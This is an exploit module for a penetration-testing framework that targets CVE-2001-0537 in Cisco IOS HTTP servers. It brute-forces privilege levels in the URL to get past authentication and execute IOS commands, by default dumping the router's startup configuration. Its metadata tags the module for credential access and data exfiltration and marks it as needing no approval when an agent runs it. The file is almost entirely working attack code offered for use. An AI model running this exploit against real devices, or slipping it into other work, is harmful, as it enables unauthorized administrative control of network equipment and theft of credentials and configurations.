#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cisco IOS HTTP Unauthorized Administrative Access"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Cisco IOS HTTP Unauthorized Administrative Access',
        'description': 'HTTP server for Cisco IOS 11.3 to 12.2 allows attackers to bypass authentication and execute arbitrary commands, when local authorization is being used, by specifying a high access level in the URL.',
        'author': ['renos stoikos'],
        'cve': ['CVE-2001-0537'],
        'platform': Platform.LINUX,
        'references': ['http://www.cvedetails.com/cve/cve-2001-0537'],
        'tags': ['iot', 'router', 'unauth', 'cve-2001-0537', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    show_command = OptString("show startup-config", "Command to be executed e.g show startup-config")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")

            path = "/level/{}/exec/-/{}".format(self.access_level, self.show_command)
            response = self.http_request(
                method="GET",
                path=path
            )
            if response is None:
                print_error("Could not execute command")  # target is not vulnerable
                return
            else:
                print_success("Exploit success! - executing command")
                print_info(re.sub('<[^<]+?>', '', response.text))
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        for num in range(16, 100):
            path = "/level/{}/exec/-/{}".format(num, self.show_command)
            response = self.http_request(
                method="GET",
                path=path
            )
            if response is None:  # target does not respond
                break

            if response.status_code == 200 and "Command was:  {}".format(self.show_command) in response.text:
                self.access_level = num
                return True  # target is vulnerable

        return False  # target is not vulnerable
